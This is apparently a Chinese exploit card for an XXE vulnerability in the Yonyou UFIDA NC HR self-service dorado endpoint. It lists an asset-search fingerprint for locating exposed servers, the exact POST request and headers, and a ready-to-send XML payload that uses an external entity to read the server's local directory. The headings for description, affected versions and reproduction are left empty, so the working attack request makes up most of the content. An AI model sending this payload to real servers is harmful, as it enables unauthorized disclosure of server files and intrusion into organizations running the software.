# 用友UFIDANCdorado存在XXE漏洞

- **系统**：用友　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`app.name="用友 UFIDA NC"`
- **请求**：`POST /hrss/dorado/smartweb2.loadfile.d?__rpc=true HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 273`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: JSESSIONID=E3C4A21AC13C42A8C5CF90ACA2431741; datasourceName=nc56; JSESSIONID=9D7…`

**请求体 / payload**
```
__type=updateData&__viewInstanceId=nc.bs.hrss.login.Login~nc.bs.hrss.login.LoginViewModel&__xml=<!DOCTYPE+ANY[<!ENTITY+xxe+SYSTEM+"./">]><rpc+method="noteInputCount"><ps><p+name="user_code">1</p ></ps><vps><p+name="DEFAULT_DATA_SOURCE">%26xxe;</p></vps></rpc>
```

**其他**
- 用友UFIDA NC dorado存在XXE漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友UFIDA NC